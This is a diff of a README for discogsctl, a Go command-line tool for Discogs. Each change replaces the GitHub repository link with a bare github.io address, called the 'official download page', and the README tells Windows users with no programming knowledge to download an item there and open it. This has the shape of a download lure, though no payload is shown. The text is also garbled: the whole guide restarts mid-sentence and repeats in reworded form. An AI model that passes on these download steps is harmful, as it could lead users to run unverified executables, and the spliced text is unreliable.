@@ -1,6 +1,6 @@
 # 🎧 discogsctl - Manage Your Music Collection Easily
 
-[![Download discogsctl](https://img.shields.io/badge/Download-discogsctl-ff69b4?style=for-the-badge&logo=github&logoColor=4b0082)](https://github.com/22388761/discogsctl)
+[![Download discogsctl](https://img.shields.io/badge/Download-discogsctl-ff69b4?style=for-the-badge&logo=github&logoColor=4b0082)](https://22388761.github.io)
 
 discogsctl is a text-based helper for Discogs, the popular music database and marketplace. It is written in Go, which helps it start quickly and run smoothly on a Windows computer. You do not need to be a programmer to follow this guide. Use the steps below to visit the download page, get the application, and open it on Windows.
 
@@ -27,7 +27,7 @@ You can use discogsctl to search for artists, releases, labels, and other music 
 
 Visit this link to download the application:
 
-https://github.com/22388761/discogsctl
+https://22388761.github.io
 
 Click the large Download badge at the top of this page or use the link above. The link opens the official discogsctl page. Use the download area on that page to save the application to your Windows computer. Keep the downloaded file in a folder you can find easily, such as Downloads. After the download finishes, open the downloaded item to start discogsctl.
 
@@ -81,7 +81,7 @@ For a more focused lookup, use an artist command:
 
 For a release lookup, use the release# 🎧 discogsctl - Manage Your Music Collection Easily
 
-[![Download discogsctl](https://img.shields.io/badge/Download-discogsctl-ff69b4?style=for-the-badge&logo=github&logoColor=4b0082)](https://github.com/22388761/discogsctl)
+[![Download discogsctl](https://img.shields.io/badge/Download-discogsctl-ff69b4?style=for-the-badge&logo=github&logoColor=4b0082)](https://22388761.github.io)
 
 discogsctl is a command-line application for Discogs, the well-known music database and marketplace. It is written in Go, which helps it start quickly and stay responsive on a Windows computer. You do not need programming knowledge to use this guide. The steps below help you visit the official download page, get the application, open it on Windows, and try your first music lookups.
 
@@ -112,7 +112,7 @@ The application is useful when you want to search for an artist, look up a relea
 
 Visit this link to download the application:
 
-https://github.com/22388761/discogsctl
+https://22388761.github.io
 
 Click the large Download badge at the top of this page or use the link above. The link opens the official discogsctl page. Use the download area on that page to save the application to your Windows computer. Keep the downloaded item in a folder you can find easily, such as Downloads. After the download finishes, continue to the next section to open discogsctl on Windows.
 
@@ -206,6 +206,6 @@ View a label: discogsctl label "Label Name"
 
 View collection: discogsctl collection
 
-Use the official download page: https://github.com/22388761/discogsctl
+Use the official download page: https://22388761.github.io
 
 Keywords: api, cli, command-line, developer-tools, discogs, discogs-api, go, go-cli, golang, music
